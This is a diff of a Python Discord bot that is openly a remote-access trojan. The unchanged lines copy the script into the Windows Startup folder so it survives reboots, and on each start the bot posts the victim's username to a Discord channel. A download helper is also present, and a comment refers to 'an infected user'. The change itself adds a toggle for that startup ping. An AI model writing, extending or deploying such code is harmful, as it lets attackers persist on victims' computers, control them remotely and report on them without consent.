@@ -12,9 +12,12 @@ import requests
 from discord import *
 from discord.utils import get
 
+global Ping_On_Startup
 global Token
 Token = ""
 # Bot Token Here Obviously
+Ping_On_Startup = True
+# if the bot should ping you when an infected user starts his Computer
 path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/control.pyw" % getenv("userprofile")
 if not exists(path):
 	copy(__file__, path)
@@ -40,7 +43,8 @@ async def on_ready():
 	username = os.getenv("USERNAME")
 	for guild in bot.guilds:
 		channel = get(guild.text_channels, name="d")
-		await channel.send(f"@everyone `{username}` started `{__file__}` <:control:1029794910695596074>")
+		if Ping_On_Startup:
+			await channel.send(f"@everyone `{username}` started `{__file__}` <:control:1029794910695596074>")
 
 
 def download(url: str, directory: str, filename: str):
